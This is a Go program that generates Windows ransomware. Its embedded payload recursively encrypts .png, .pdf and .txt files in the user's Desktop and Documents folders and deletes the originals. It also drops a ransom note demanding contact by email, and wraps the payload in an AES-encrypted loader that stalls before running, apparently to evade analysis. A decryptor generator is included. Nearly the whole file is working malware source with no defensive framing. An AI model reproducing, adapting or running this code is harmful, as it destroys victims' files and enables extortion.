package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	if len(os.Args) < 2 || len(os.Args) > 3 {
		fmt.Println("Usage: go run . <encrypt/decrypt>  <key(only for decryption)>")
		return
	}

	if os.Args[1] == "encrypt" {
		mainProg, err := createExec("start", encCode())
		if err != nil {
			log.Fatal(err)
		}

		encBin, key, err := encryptBinary(mainProg)
		if err != nil {
			log.Fatal(err)
		}
		outerProg, err := createExec("mlw.exe", outerCode(hex.EncodeToString(encBin), key))
		if err != nil {
			log.Fatal(err)
		}
		os.Rename(outerProg, "./mlw.exe")
		os.Remove(mainProg)
	}

	if os.Args[1] == "decrypt" {
		if len(os.Args) < 3 {
			fmt.Println("Specify decryption key")
			return
		}

		decProg, err := createExec("decryptor.exe", decCode(os.Args[2]))
		if err != nil {
			log.Fatal(err)
		}

		os.Rename(decProg, "./decryptor.exe")
	}
}

func createExec(name, codeStr string) (string, error) {
	cacheDir, err := os.UserCacheDir()
	if err != nil {
		fmt.Println("1")
		return name, err
	}
	tmpPath := filepath.Join(cacheDir, "tmpfile.go")

	file, err := os.Create(tmpPath)
	if err != nil {
		fmt.Println("2")
		return name, err
	}
	defer file.Close()

	_, err = file.WriteString(codeStr)
	if err != nil {
		fmt.Println("3")
		return name, err
	}

	tmpExec := filepath.Join(cacheDir, name)

	cmd := exec.Command("go", "build", "-o", tmpExec, tmpPath)
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
	err = cmd.Run()
	if err != nil {
		fmt.Println("4")
		return name, err
	}
	os.Remove(tmpPath)

	return tmpExec, nil
}

func encryptBinary(filePath string) ([]byte, []byte, error) {
	bin, err := os.ReadFile(filePath)
	if err != nil {
		return nil, nil, err
	}

	key := make([]byte, 16)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		return nil, nil, err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, nil, err
	}

	encrypted := gcm.Seal(nonce, nonce, bin, nil)

	return encrypted, key, nil
}

func encCode() string {
	return `
	package main

	import (
		"crypto/aes"
		"crypto/cipher"
		"crypto/rand"
		"encoding/hex"
		"io"
		"log"
		"os"
		"os/user"
		"path/filepath"
		"strings"
	)

	func main() {
		k := make([]byte, 16)
		if _, err := io.ReadFull(rand.Reader, k); err != nil {
			log.Fatal(err)
		}
		dt := run(k)
		text := "All of your files have been encrypted,To unlock them contact me with your encryption code in this email@email.com, your encryption code is : " + hex.EncodeToString(k)
		err := os.WriteFile(filepath.Join(dt, "READ THIS.txt"), []byte(text), 0644)
		if err != nil {
			log.Fatal(err)
		}

	}

	func run(k []byte) string {
		k = append(k, []byte("koodJohviLastExc")...)
		b, err := aes.NewCipher(k)
		if err != nil {
			log.Fatal(err)
		}

		g, err := cipher.NewGCM(b)
		if err != nil {
			log.Fatal(err)
		}

		n := make([]byte, g.NonceSize())
		if _, err = io.ReadFull(rand.Reader, n); err != nil {
			log.Fatal(err)
		}

		u, err := user.Current()
		if err != nil {
			log.Fatal(err)
		}

		srch(filepath.Join(u.HomeDir, "Desktop"), g, n)
		srch(filepath.Join(u.HomeDir, "Documents"), g, n)

		return filepath.Join(u.HomeDir, "Desktop")
	}

	func srch(dir string, g cipher.AEAD, n []byte) {
		fls, err := os.ReadDir(dir)
		if err != nil {
			log.Fatal(err)
		}
		exts := []string{".png", ".pdf", ".txt"}

		for _, f := range fls {
			if f.IsDir() {
				srch(filepath.Join(dir, f.Name()), g, n)
			} else {
				for _, e := range exts {
					if strings.HasSuffix(f.Name(), e) {
						create(filepath.Join(dir, f.Name()), g, n)
						break
					}
				}
			}
		}
	}

	func create(fN string, g cipher.AEAD, n []byte) error {
		f, err := os.ReadFile(fN)
		if err != nil {
			return err
		}

		res := g.Seal(n, n, f, nil)

		err = os.WriteFile(fN+".mlwr", res, 0644)
		if err != nil {
			log.Fatal(err)
		}

		err = os.Remove(fN)
		if err != nil {
			log.Fatal(err)
		}

		return nil
	}`
}

func decCode(k string) string {
	return fmt.Sprintf(`
	package main

	import (
		"crypto/aes"
		"crypto/cipher"
		"encoding/hex"
		"log"
		"os"
		"os/user"
		"path/filepath"
		"strings"
	)

	func main() {
		key, err := hex.DecodeString(%#v)
		if err != nil {
			log.Fatal(err)
		}

		key = append(key, []byte("koodJohviLastExc")...)

		block, err := aes.NewCipher(key)
		if err != nil {
			log.Fatal(err)
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			log.Fatal(err)
		}

		nonceSize := gcm.NonceSize()

		u, err := user.Current()
		if err != nil {
			log.Fatal(err)
		}

		srch(filepath.Join(u.HomeDir, "Desktop"), gcm, nonceSize)
		srch(filepath.Join(u.HomeDir, "Documents"), gcm, nonceSize)
		os.Remove(filepath.Join(u.HomeDir, "Desktop/READ THIS.txt"))
	}

	func srch(dir string, g cipher.AEAD, nSize int) {
		fls, err := os.ReadDir(dir)
		if err != nil {
			log.Fatal(err)
		}

		for _, f := range fls {
			if f.IsDir() {
				srch(filepath.Join(dir, f.Name()), g, nSize)
			} else if strings.HasSuffix(f.Name(), ".mlwr") {
				create(filepath.Join(dir, f.Name()), g, nSize)
			}
		}
	}

	func create(fN string, g cipher.AEAD, nSize int) error {
		f, err := os.ReadFile(fN)
		if err != nil {
			return err
		}

		nonce, f := f[:nSize], f[nSize:]

		decrypted, err := g.Open(nil, nonce, f, nil)
		if err != nil {
			return err
		}

		fileName := strings.TrimSuffix(fN, ".mlwr")
		err = os.WriteFile(fileName, decrypted, 0644)
		if err != nil {
			log.Fatal(err)
		}

		err = os.Remove(fN)
		if err != nil {
			log.Fatal(err)
		}

		return nil
	}`, k)
}

func outerCode(bin string, key []byte) string {
	return fmt.Sprintf(`
	package main

	import (
		"crypto/aes"
		"crypto/cipher"
		"encoding/hex"
		"log"
		"os"
		"os/exec"
		"path/filepath"
		"time"
	)


	func main() {
		counter := 0
		for counter < 100001 {
			counter++
		}
		
		time.Sleep(2 * time.Second)

		decryptedBin, err := decryptBinary(%#v, %#v)
		if err != nil {
			log.Fatal(err)
		}
		err = runBinary(decryptedBin)
		if err != nil {
			log.Fatal(err)
		}
		
	}
	func decryptBinary(bin string, key []byte) ([]byte, error) {
		encrypted, err := hex.DecodeString(bin)
		if err != nil {
			return nil, err
		}
	
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, err
		}
	
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
	
		nonceSize := gcm.NonceSize()
		nonce, encrypted := encrypted[:nonceSize], encrypted[nonceSize:]
	
		decrypted, err := gcm.Open(nil, nonce, encrypted, nil)
		if err != nil {
			return nil, err
		}
	
		return decrypted, nil
	}
	
	func runBinary(data []byte) error {
		cacheDir, err := os.UserCacheDir()
		if err != nil {
			return err
		}
		tmpPath := filepath.Join(cacheDir, "tmpexec.exe")
		os.Remove(tmpPath)

		err = os.WriteFile(tmpPath, data, 0755)
		if err != nil {
			return err
		}

		cmd := exec.Command(tmpPath)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		err = cmd.Run()
		if err != nil {
			return err
		}
		os.Remove(tmpPath)
		return nil
	}
	`, bin, key)
}
